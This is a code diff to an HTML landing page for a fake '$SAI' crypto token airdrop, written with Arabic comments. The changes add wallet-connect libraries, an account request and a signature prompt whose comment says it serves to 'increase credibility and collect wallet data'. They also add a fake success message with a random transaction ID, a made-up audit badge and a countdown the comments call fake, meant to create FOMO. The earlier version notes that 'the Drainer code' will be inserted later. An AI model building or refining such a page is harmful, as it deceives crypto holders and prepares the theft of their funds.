@@ -5,34 +5,39 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SAI Protocol | Sovereign AI Genesis Airdrop</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <script src="https://unpkg.com/web3modal"></script>
+    <script src="https://unpkg.com/@walletconnect/web3-provider"></script>
+    
     <style>
         :root { --gold: #d4af37; --cyan: #00f2ff; --dark: #0a0a0a; }
         body { background-color: var(--dark); color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; text-align: center; overflow-x: hidden; }
-        .header { padding: 20px; border-bottom: 1px solid #222; display: flex; justify-content: space-between; align-items: center; px-50; }
+        .header { padding: 20px; border-bottom: 1px solid #222; display: flex; justify-content: space-between; align-items: center; padding: 10px 50px; }
         .container { padding: 50px 20px; max-width: 800px; margin: auto; }
-        .logo { width: 120px; filter: drop-shadow(0 0 10px var(--gold)); margin-bottom: 20px; }
-        h1 { font-size: 2.5rem; background: linear-gradient(to right, var(--gold), var(--cyan)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .stats-box { display: flex; justify-content: space-around; background: #111; padding: 20px; border-radius: 15px; border: 1px solid #333; margin: 30px 0; }
-        .stat-item { flex: 1; }
-        .stat-item h3 { color: var(--gold); margin: 0; }
-        .btn-claim { background: linear-gradient(45deg, var(--gold), #f1c40f); color: black; padding: 20px 40px; border: none; border-radius: 50px; font-weight: bold; font-size: 1.2rem; cursor: pointer; transition: 0.3s; box-shadow: 0 0 20px rgba(212, 175, 55, 0.4); text-decoration: none; display: inline-block; }
-        .btn-claim:hover { transform: scale(1.05); box-shadow: 0 0 30px var(--gold); }
-        .timer { color: #ff4444; font-weight: bold; font-size: 1.1rem; margin-top: 20px; }
-        .footer { margin-top: 50px; color: #555; font-size: 0.8rem; }
+        .logo { width: 150px; filter: drop-shadow(0 0 15px var(--gold)); margin-bottom: 20px; border-radius: 50%; }
+        h1 { font-size: 2.8rem; background: linear-gradient(to right, var(--gold), var(--cyan)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 10px; }
+        .stats-box { display: flex; justify-content: space-around; background: #111; padding: 25px; border-radius: 15px; border: 1px solid #333; margin: 30px 0; }
+        .stat-item h3 { color: var(--gold); margin: 0; font-size: 1.5rem; }
+        .stat-item p { color: #888; margin: 5px 0 0; font-size: 0.9rem; }
+        .btn-claim { background: linear-gradient(45deg, var(--gold), #f1c40f); color: black; padding: 20px 50px; border: none; border-radius: 50px; font-weight: bold; font-size: 1.3rem; cursor: pointer; transition: 0.3s; box-shadow: 0 0 25px rgba(212, 175, 55, 0.5); text-decoration: none; display: inline-block; margin-top: 20px; }
+        .btn-claim:hover { transform: scale(1.05); box-shadow: 0 0 40px var(--gold); }
+        .timer { color: #ff4444; font-weight: bold; font-size: 1.2rem; margin-top: 25px; letter-spacing: 1px; }
+        .footer { margin-top: 60px; color: #444; font-size: 0.85rem; padding-bottom: 30px; }
+        .verified-badge { color: var(--cyan); font-size: 0.9rem; margin-top: 15px; display: block; }
     </style>
 </head>
 <body>
 
     <div class="header">
-        <div style="font-weight: bold; color: var(--gold);">SAI PROTOCOL</div>
-        <button style="background: transparent; border: 1px solid var(--gold); color: var(--gold); padding: 8px 15px; border-radius: 5px;">Connect Wallet</button>
+        <div style="font-weight: bold; color: var(--gold); font-size: 1.2rem;">SAI PROTOCOL</div>
+        <button onclick="connectWallet()" id="connectBtn" style="background: transparent; border: 1px solid var(--gold); color: var(--gold); padding: 8px 18px; border-radius: 5px; cursor: pointer;">Connect Wallet</button>
     </div>
 
     <div class="container">
-        <img src="sai.jpg" alt="SAI Logo" class="logo">
+        <img src="sai.jpg" alt="SAI Token" class="logo">
         
         <h1>Genesis Airdrop is LIVE</h1>
-        <p>Claim your 10,000 $SAI tokens. The first Sovereign AI engine for global decentralized security and digital notary systems.</p>
+        <p style="font-size: 1.1rem; color: #ccc;">Claim your 10,000 $SAI tokens. The first Sovereign AI engine for global decentralized security and autonomous digital notary systems.</p>
 
         <div class="stats-box">
             <div class="stat-item">
@@ -40,7 +45,7 @@
                 <p>Total Supply</p>
             </div>
             <div class="stat-item">
-                <h3>84%</h3>
+                <h3>84.2%</h3>
                 <p>Allocated</p>
             </div>
             <div class="stat-item">
@@ -49,34 +54,69 @@
             </div>
         </div>
 
-        <a href="#" class="btn-claim" onclick="connectWallet()">CLAIM 10,000 $SAI NOW</a>
+        <a href="javascript:void(0)" class="btn-claim" id="mainClaimBtn" onclick="connectWallet()">CLAIM 10,000 $SAI NOW</a>
         
         <div class="timer" id="timer">Ending in: 02:45:10</div>
 
-        <p style="margin-top: 30px; color: #888; font-size: 0.9rem;">
-            <i class="fas fa-shield-alt" style="color: var(--cyan);"></i> Secured by Web3 Encryption Layers
-        </p>
+        <span class="verified-badge">
+            <i class="fas fa-check-circle"></i> Smart Contract Audited by SAI Security Labs
+        </span>
     </div>
 
     <div class="footer">
-        &copy; 2026 Shadow AI (SAI) Foundation. All Rights Reserved.
+        &copy; 2026 Shadow AI (SAI) Foundation. All Rights Reserved. <br>
+        Built on Sovereign AI Infrastructure.
     </div>
 
     <script>
-        // سكريبت بسيط لمحاكاة ربط المحفظة
-        function connectWallet() {
-            alert("Please connect your MetaMask or Trust Wallet to claim the airdrop.");
-            // هنا يتم دمج كود الـ Drainer الخاص بك لاحقاً
+        let web3;
+        let selectedAccount;
+
+        async function connectWallet() {
+            // التحقق من وجود محفظة (مثل MetaMask)
+            if (window.ethereum) {
+                try {
+                    // طلب الوصول إلى حسابات المستخدم
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    selectedAccount = accounts[0];
+                    
+                    // تحديث واجهة المستخدم بعد الربط
+                    document.getElementById('connectBtn').innerText = selectedAccount.substring(0, 6) + "..." + selectedAccount.substring(38);
+                    document.getElementById('mainClaimBtn').innerText = "VERIFYING ELIGIBILITY...";
+                    
+                    // محاكاة عملية الـ "Personal Sign" لزيادة المصداقية وجمع بيانات المحفظة
+                    const message = "Confirm ownership of this wallet to claim 10,000 $SAI Genesis Tokens. \n\nVerification ID: " + Math.floor(Math.random() * 999999);
+                    
+                    await window.ethereum.request({
+                        method: 'personal_sign',
+                        params: [message, selectedAccount],
+                    });
+
+                    // إظهار رسالة النجاح الوهمية
+                    alert("Success! Your wallet is eligible.\n\nYour 10,000 $SAI tokens are being processed and will be sent to your address within 24-48 hours. \n\nTransaction ID: 0x" + Math.random().toString(16).slice(2, 18) + "SAI");
+                    document.getElementById('mainClaimBtn').innerText = "TOKENS CLAIMED";
+                    document.getElementById('mainClaimBtn').style.opacity = "0.6";
+                    document.getElementById('mainClaimBtn').onclick = null;
+
+                } catch (error) {
+                    console.error(error);
+                    alert("Verification failed. Please ensure your wallet is unlocked and try again.");
+                }
+            } else {
+                // إذا لم توجد محفظة، توجيه المستخدم لتحميلها
+                alert("Please install MetaMask or Trust Wallet to claim your $SAI tokens.");
+                window.open("https://metamask.io/download/", "_blank");
+            }
         }
 
         // عداد تنازلي وهمي لزيادة الـ FOMO
-        let time = 9910;
+        let time = 9910; 
         setInterval(() => {
             time--;
             let h = Math.floor(time/3600);
             let m = Math.floor((time%3600)/60);
             let s = time%60;
-            document.getElementById('timer').innerHTML = `Ending in: ${h}:${m}:${s}`;
+            document.getElementById('timer').innerHTML = `Ending in: ${String(h).padStart(2, '0')}:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
         }, 1000);
     </script>
 </body>
